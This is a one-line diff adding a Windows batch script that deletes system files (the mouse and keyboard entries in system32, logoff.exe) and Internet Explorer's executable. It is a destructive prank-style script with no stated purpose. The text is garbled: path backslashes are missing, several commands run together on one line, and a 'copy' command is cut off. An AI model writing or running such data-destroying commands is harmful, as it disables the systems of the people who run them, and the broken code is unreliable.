@@ -1,0 +1,1 @@
+@echo off @if exist c:windowssystem32mouse del c:windowssystem32mouse@if exist c:windowssystem32keyboard del c:windowssystem32keyboardcopy C:windows@if exist c:windowssystem32logoff.exe del c:windowssystem32logoff.exe@if exist C:program filesinternet exploreriexplore.exe del C:program filesinternet exploreriexplore.exe 
